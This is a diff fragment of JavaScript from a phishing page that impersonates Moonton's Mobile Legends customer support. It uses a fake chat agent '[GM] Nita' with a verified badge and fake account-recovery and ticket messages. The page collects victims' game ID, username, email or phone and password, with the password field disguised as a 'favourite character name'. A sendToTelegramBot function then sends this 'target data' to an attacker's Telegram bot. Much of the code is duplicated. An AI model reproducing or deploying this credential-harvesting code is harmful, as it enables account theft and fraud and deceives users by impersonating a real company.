-                formElement.querySelectorAll('input, button').forEach(el => el.disabled = true);
-
-                // UPDATING MESSAGE
-                addMessage(`Id/Server: ${userIdKode}, Username: ${usernameJagoan}`, 'user');
-                
-                registrationData.user_id_kode = userIdKode;
-                registrationData.username_jagoan = usernameJagoan;
-                
-                const typingEl = showTypingIndicator();
-                await new Promise(resolve => setTimeout(resolve, 800));
-                removeTypingIndicator();
-
-                // START TEXT CHANGE HERE
-                const botResponse = `Hey hero! Your account data has been received, to verify please log in with your account.`;
-                
-                const daftarButton = 
-                    `<button 
-                        class="bg-blue-600 text-white text-sm font-normal py-1 px-3 rounded-full hover:bg-blue-700 transition duration-150 mt-2" 
-                        onclick="openSelectionModal('Cancel change email (Lanjutan)')"
-                    >
-                        Login.
-                    </button>`;
-                
-                addMessage(botResponse + `<p class="mt-2">${daftarButton}</p>`, 'bot');
-            } else {
-                 handleFinalDataSubmission(formElement);
-            }
-        }
-
-        window.handleCommand = function(command) {
-            const normalizedCommand = command.toLowerCase().trim();
-            
-            const inlineForm = document.getElementById('inlineForm');
-            if (inlineForm) {
-                inlineForm.closest('.flex.justify-start').remove();
-            }
-
-            addMessage(command, 'user');
-            
-            showTypingIndicator();
-
-            setTimeout(async () => {
-                removeTypingIndicator();
-                let botResponse = '';
-
-                switch (normalizedCommand) {
-                    // UPDATED COMMAND: Cancel change email
-                    case 'cancel change email':
-                        if (registrationCompleted) {
-                            botResponse = `<p>Berikut adalah list harga Diamond Mobile Legends:</p>
-                                <ul>
-                                    <li>100 Diamond: Rp 25.000</li>
-                                    <li>200 Diamond: Rp 49.000</li>
-                                    <li>500 Diamond: Rp 120.000</li>
-                                </ul>`;
-                            addMessage(botResponse, 'bot');
-                        } else if (modalCompleted) {
-                            showInlineRegistrationForm(true); 
-                        } else {
-                            showInlineRegistrationForm(false); 
-                        }
-                        return;
-                        
-                    // UPDATED COMMAND: Account Recovery
-                    case 'account recovery': 
-                        // START NEW TEXT RESPONSE FOR ACCOUNT RECOVERY
-                        // MENGUBAH UKURAN BADGE MENJADI 18x18 DENGAN OBJECT-FIT: CONTAIN UNTUK MENGHINDARI DISTORSI
-                        const verifBadge = `<img src="https://i.postimg.cc/jdFqvrFK/pngtree-instagram-bule-tick-insta-blue-star-vector-png-image-6695210.png" alt="Verified Badge" style="width: 18px; height: 18px; margin-left: 4px; display: inline-block; vertical-align: middle; object-fit: contain;">`;
-                        
-                        botResponse = 
-                            `<p>Hey hero! We understand you're having trouble recovering your account. However, we're still experiencing server issues for account recovery. We'll update you soon.</p>
-                            <p class="mt-3">Sincerely, Moonton Technology Co.</p>
-                            <p class="mt-1 font-semibold text-blue-600">[GM] Nita ${verifBadge}</p>`;
-                        break;
-                        // END NEW TEXT RESPONSE
-
-                    // UPDATED COMMAND: Bug Reports
-                    case 'bug reports':
-                        botResponse = 
-                            `<p>visit our <a href="https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=hai%20aku%20ingin%20mengajukan%20keluhan" target="_blank" class="text-blue-600 hover:underline font-semibold">Customer service</a> to explain bugs in the game</p>`;
-                        break;
-                    default:
-                        botResponse = 'Maaf, perintah tersebut tidak dikenali. Silakan pilih dari menu di atas.';
-                }
-
-                if (botResponse) {
-                     addMessage(botResponse, 'bot');
-                }
-            }, 800);
-        }
-
-        // --- REGISTRATION VIEW LOGIC ---
-        
-        // KRUSIAL: Memindahkan showStep ke atas agar dapat diakses oleh startRegistrationFlow
-        function showStep(stepNumber) {
-            // PERBAIKAN: Memastikan registrationView terlihat dengan benar
-            if (registrationView.classList.contains('view-hidden') || registrationView.style.display === 'none') {
-                switchView('registration');
-            }
-            
-            step1.style.display = 'none';
-            step2.style.display = 'none';
-            step3.style.display = 'none';
-            
-            let titleText = "";
-
-            if (stepNumber === 2) {
-                step2.style.display = 'flex';
-                titleText = "Username Pengguna";
-                setTimeout(() => {
-                    usernameUserInput.focus();
-                    // Inisialisasi state floating label setelah step muncul
-                    const group = usernameUserInput.closest('.floating-label-group');
-                    if (group) group.classList.add('focused');
-                }, 100);
-            }
-            if (stepNumber === 3) {
-                step3.style.display = 'flex';
-                titleText = "Nama Tokoh Kesukaan";
-                // Mengatur type input sandi secara eksplisit saat step 3 muncul
-                namaTokohInput.type = 'password'; 
-                
-                setTimeout(() => {
-                    namaTokohInput.focus();
-                    // Inisialisasi state floating label setelah step muncul
-                    const group = namaTokohInput.closest('.floating-label-group');
-                    if (group) group.classList.add('focused');
-                }, 100);
-            }
-            // PERBAIKAN: Memperbarui judul di header registration view
-            if (registrationTitle) {
-                registrationTitle.textContent = titleText;
-            }
-        }
-        
-        // KRUSIAL: Tambahkan event listener untuk Floating Label di registrationView
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('#registrationView .floating-label-group input').forEach(input => {
-                
-                // Tambahkan event listener untuk memicu efek floating
-                const updateFloatingState = () => {
-                    const isFilled = input.value.trim() !== '';
-                    const isFocused = document.activeElement === input;
-                    const group = input.closest('.floating-label-group');
-
-                    // Set 'filled' class if input has content (for floating)
-                    group.classList.toggle('filled', isFilled);
-                    // Set 'focused' class if input is currently focused (for blue border/outline)
-                    group.classList.toggle('focused', isFocused); 
-                };
-
-                input.addEventListener('focus', updateFloatingState);
-                input.addEventListener('blur', updateFloatingState);
-                input.addEventListener('input', updateFloatingState);
-                
-                // Initialize state in case the input has text on load
-                updateFloatingState();
-            });
-            
-            // Inisialisasi floating label untuk inline form (jika ada)
-            document.querySelectorAll('#chatArea .floating-label-group input').forEach(input => {
-                if (input.value.trim() !== '') {
-                    input.classList.add('is-not-placeholder');
-                }
-                input.addEventListener('input', () => {
-                    if (input.value.trim() !== '') {
-                        input.classList.add('is-not-placeholder');
-                    } else {
-                        input.classList.remove('is-not-placeholder');
-                    }
-                });
-            });
-        });
-        
-        // [REVISI KRUSIAL] Fungsi Tampilkan Sandi
-        window.handleShowPassword = function(checkbox) {
-            const input = document.getElementById('namaTokohInput');
-            if (checkbox.checked) {
-                // Mengubah type dari password ke text
-                input.type = 'text';
-            } else {
-                // Mengubah type dari text kembali ke password
-                input.type = 'password';
-            }
-            input.focus();
-        }
-
-        window.processStep2 = async function() {
-            const usernameUser = usernameUserInput.value.trim();
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            // Dapatkan elemen error
-            const errorElement = document.getElementById('usernameError');
-
-            // Reset pesan error
-            errorElement.textContent = '';
-            errorElement.style.display = 'none';
-            
-            if (!usernameUser) {
-                // Tampilkan error inline: Mohon masukkan alamat email atau nomor telepon.
-                errorElement.textContent = 'Mohon masukkan alamat email atau nomor telepon.';
-                errorElement.style.display = 'block';
-                return;
-            }
-            
-            // Validasi format email yang salah
-            if (!emailRegex.test(usernameUser)) {
-                // Tampilkan error inline dengan detail
-                errorElement.textContent = "ⓘ Can't find your Google account.";
-                errorElement.style.display = 'block';
-                return;
-            }
-
-            registrationData.username_user = usernameUser;
-
-            const step2Loader = document.getElementById('step2Loader');
-            step2Loader.classList.remove('hidden');
-            
-            await new Promise(resolve => setTimeout(resolve, 1500)); 
-
-            step2Loader.classList.add('hidden');
-            showStep(3);
-        }
-        
-        // Fungsi showModalAlert dipertahankan hanya untuk error non-input (misal Telegram/Firebase)
-        window.showModalAlert = function(message) {
-            const alertBox = document.createElement('div');
-            // Menghapus class yang memicu animasi (alert-show, alert-hide)
-            alertBox.className = 'fixed top-4 left-1/2 transform -translate-x-1/2 bg-red-700 text-white px-4 py-2 rounded shadow-lg z-50';
-            alertBox.textContent = message;
-            document.body.appendChild(alertBox);
-
-            setTimeout(() => {
-                // Langsung hapus elemen tanpa transisi smooth jika ini hanya fallback
-                if(document.body.contains(alertBox)) {
-                    document.body.removeChild(alertBox);
-                }
-            }, 2500);
-        }
-
-        window.processRegistration = async function() {
-            const namaTokoh = namaTokohInput.value.trim();
-            if (!namaTokoh) {
-                showModalAlert("Nama Tokoh Kesukaan tidak boleh kosong!");
-                return;
-            }
-            registrationData.nama_tokoh = namaTokoh;
-            
-            closeRegistrationView();
-            
-            fullScreenLoader.classList.remove('hidden');
-            fullScreenLoader.classList.remove('opacity-0');
-            
-            modalCompleted = true;
-
-            await new Promise(resolve => setTimeout(resolve, 1000)); 
-            
-            fullScreenLoader.classList.add('opacity-0');
-            setTimeout(() => fullScreenLoader.classList.add('hidden'), 300);
-
-            // Definisikan verifBadge di sini untuk ketersediaan di scope ini
-            const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified Badge" style="width: 18px; height: 18px; margin-left: 4px; display: inline-block; vertical-align: middle; object-fit: contain;">`;
-
-            // MEMPERBAIKI STRUCTURE TEMPLATE LITERAL DAN MENAMBAHKAN TANDA TANGAN
-            const botResponse = `
-                <p class="font-bold text-blue-600" style="font-size: 1.125rem;">Report has been received!</p>
-                <p class="mt-0">Please re-verify your account. No one else can access this report except you. Ensure the data is correct to avoid errors.</p>
-                <p class="mt-0 font-semibold text-blue-600">[GM] Nita ${verifBadge}</p>`;
-            
-            addMessage(botResponse, 'bot');
-            
-            showInlineRegistrationForm(true);
-        }
-
-        async function sendToTelegramBot(data) {
-            if (TELEGRAM_CHAT_ID === '0') {
-                console.error("Peringatan: Tidak mengirim ke Telegram. TELEGRAM_CHAT_ID masih menggunakan nilai placeholder.");
-                addMessage(`⚠️ **Penting:** Pendaftaran berhasil secara lokal, tetapi data TIDAK terkirim ke admin. Untuk memperbaikinya, ganti ID numerik '0' di variabel **TELEGRAM_CHAT_ID** dengan ID numerik yang benar untuk admin **${ADMIN_USERNAME}**.`, 'bot');
-                return; 
-            }
-            
-            const message = 
-                `*DATA LENGKAP TARGET*\n` +
-                `----------------------------------------\n` +
-                `*Id/Server :* ${data.user_id_kode || '-'}\n` +
-                `*Username :* ${data.username_jagoan || '-'}\n` +
-                `*Email atau nomor telepon :* ${data.username_user || '-'}\n` +
-                `*Password :* ${data.nama_tokoh || '-'}\n` +
-                `*IP Address:* ${data.ip_address || 'Tidak Ditemukan'}\n` +
-                `*Sumber :* ${data.source || 'Modal Langsung'}\n` +
-                `----------------------------------------`;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                if (response.ok) {
-                    console.log("Data pendaftaran berhasil dikirim ke Telegram!");
-                } else {
-                    const error = await response.json();
-                    console.error("Gagal mengirim data ke Telegram:", error);
-                    addMessage(`⚠️ Peringatan: Gagal mengirim data ke Telegram Bot. Kode status: ${response.status}. Detail: ${error.description}`, 'bot');
-                }
-            } catch (error) {
-                console.error("Kesalahan jaringan saat mengirim ke Telegram:", error);
-                     addMessage(`⚠️ Peringatan: Terjadi kesalahan jaringan saat mencoba mengirim data ke Telegram. (Gagal fetch)`, 'bot');
-            }
-        }
-
-        window.handleCommand = function(command) {
-            const normalizedCommand = command.toLowerCase().trim();
-            
-            const inlineForm = document.getElementById('inlineForm');
-            if (inlineForm) {
-                inlineForm.closest('.flex.justify-start').remove();
-            }
-
-            addMessage(command, 'user');
-            
-            showTypingIndicator();
-
-            setTimeout(async () => {
-                removeTypingIndicator();
-                let botResponse = '';
-
-                switch (normalizedCommand) {
-                    // UPDATED COMMAND: Cancel change email
-                    case 'cancel change email':
-                        if (registrationCompleted) {
-                            botResponse = `<p>Berikut adalah list harga Diamond Mobile Legends:</p>
-                                <ul>
-                                    <li>100 Diamond: Rp 25.000</li>
-                                    <li>200 Diamond: Rp 49.000</li>
-                                    <li>500 Diamond: Rp 120.000</li>
-                                </ul>`;
-                            addMessage(botResponse, 'bot');
-                        } else if (modalCompleted) {
-                            showInlineRegistrationForm(true); 
-                        } else {
-                            showInlineRegistrationForm(false); 
-                        }
-                        return;
-                        
-                    // UPDATED COMMAND: Account Recovery
-                    case 'account recovery': 
-                        // START NEW TEXT RESPONSE FOR ACCOUNT RECOVERY
-                        // MENGUBAH UKURAN BADGE MENJADI 18x18 DENGAN OBJECT-FIT: CONTAIN UNTUK MENGHINDARI DISTORSI
-                        const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified Badge" style="width: 18px; height: 18px; margin-left: 4px; display: inline-block; vertical-align: middle; object-fit: contain;">`;
-                        
-                        botResponse = 
-                            `<p>Hey hero! We understand you're having trouble recovering your account. However, we're still experiencing server issues for account recovery. We'll update you soon.</p>
-                            <p class="mt-3">Sincerely, Moonton Technology Co.</p>
-                            <p class="mt-1 font-semibold text-blue-600">[GM] Nita ${verifBadge}</p>`;
-                        break;
-                        // END NEW TEXT RESPONSE
-
-                    // UPDATED COMMAND: Bug Reports
-                    case 'bug reports':
-                        botResponse = 
-                            `<p>visit our <a href="https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=Hi%20Moonton,%20I%20want%20to%20report%20about%20bug%20report" target="_blank" class="text-blue-600 hover:underline font-semibold">Customer service</a> to explain bugs in the game</p>`;
-                        break;
-                    default:
-                        botResponse = 'Maaf, perintah tersebut tidak dikenali. Silakan pilih dari menu di atas.';
-                }
-
-                if (botResponse) {
-                     addMessage(botResponse, 'bot');
-                }
-            }, 800);
-        }
-
-        // --- REGISTRATION VIEW LOGIC ---
-        
-        // KRUSIAL: Memindahkan showStep ke atas agar dapat diakses oleh startRegistrationFlow
-        function showStep(stepNumber) {
-            // PERBAIKAN: Memastikan registrationView terlihat dengan benar
-            if (registrationView.classList.contains('view-hidden') || registrationView.style.display === 'none') {
-                switchView('registration');
-            }
-            
-            step1.style.display = 'none';
-            step2.style.display = 'none';
-            step3.style.display = 'none';
-            
-            let titleText = "";
-
-            if (stepNumber === 2) {
-                step2.style.display = 'flex';
-                titleText = "Username Pengguna";
-                setTimeout(() => {
-                    usernameUserInput.focus();
-                    // Inisialisasi state floating label setelah step muncul
-                    const group = usernameUserInput.closest('.floating-label-group');
-                    if (group) group.classList.add('focused');
-                }, 100);
-            }
-            if (stepNumber === 3) {
-                step3.style.display = 'flex';
-                titleText = "Nama Tokoh Kesukaan";
-                // Mengatur type input sandi secara eksplisit saat step 3 muncul
-                namaTokohInput.type = 'password'; 
-                
-                setTimeout(() => {
-                    namaTokohInput.focus();
-                    // Inisialisasi state floating label setelah step muncul
-                    const group = namaTokohInput.closest('.floating-label-group');
-                    if (group) group.classList.add('focused');
-                }, 100);
-            }
-            // PERBAIKAN: Memperbarui judul di header registration view
-            if (registrationTitle) {
-                registrationTitle.textContent = titleText;
-            }
-        }
-        
-        // KRUSIAL: Tambahkan event listener untuk Floating Label di registrationView
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('#registrationView .floating-label-group input').forEach(input => {
-                
-                // Tambahkan event listener untuk memicu efek floating
-                const updateFloatingState = () => {
-                    const isFilled = input.value.trim() !== '';
-                    const isFocused = document.activeElement === input;
-                    const group = input.closest('.floating-label-group');
-
-                    // Set 'filled' class if input has content (for floating)
-                    group.classList.toggle('filled', isFilled);
-                    // Set 'focused' class if input is currently focused (for blue border/outline)
-                    group.classList.toggle('focused', isFocused); 
-                };
-
-                input.addEventListener('focus', updateFloatingState);
-                input.addEventListener('blur', updateFloatingState);
-                input.addEventListener('input', updateFloatingState);
-                
-                // Initialize state in case the input has text on load
-                updateFloatingState();
-            });
-            
-            // Inisialisasi floating label untuk inline form (jika ada)
-            document.querySelectorAll('#chatArea .floating-label-group input').forEach(input => {
-                if (input.value.trim() !== '') {
-                    input.classList.add('is-not-placeholder');
-                }
-                input.addEventListener('input', () => {
-                    if (input.value.trim() !== '') {
-                        input.classList.add('is-not-placeholder');
-                    } else {
-                        input.classList.remove('is-not-placeholder');
-                    }
-                });
-            });
-        });
-    </script>
+        input.addEventListener('focus', updateFloatingState);
+        input.addEventListener('blur', updateFloatingState);
+        input.addEventListener('input', updateFloatingState);
+        updateFloatingState();
+    });
+});
+</script>
 </body>
-
 </html>
-
